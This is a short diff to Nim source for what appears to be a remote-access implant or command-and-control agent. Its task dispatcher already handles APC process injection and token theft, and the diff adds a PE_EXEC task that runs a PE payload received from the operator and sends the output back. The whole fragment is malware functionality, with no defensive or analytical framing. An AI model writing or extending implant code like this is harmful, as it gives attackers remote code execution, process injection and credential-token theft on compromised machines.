@@ -901,6 +901,12 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
       if pid == 0: t.sendResult(id, "", "INJECT_APC requires {\"pid\":N}"); return
       t.sendResult(id, doInjectAPC(pid, payload), "")
     except: t.sendResult(id, "", "inject_apc: " & getCurrentExceptionMsg())
+  of "PE_EXEC":
+    if payload.len == 0: t.sendResult(id, "", "no PE payload"); return
+    try:
+      let r = execPE(payload)
+      t.sendResult(id, r, "")
+    except: t.sendResult(id, "", "pe_exec: " & getCurrentExceptionMsg())
   of "TOKEN_STEAL":
     try:
       let pid = parseJson(args){"pid"}.getInt(0)
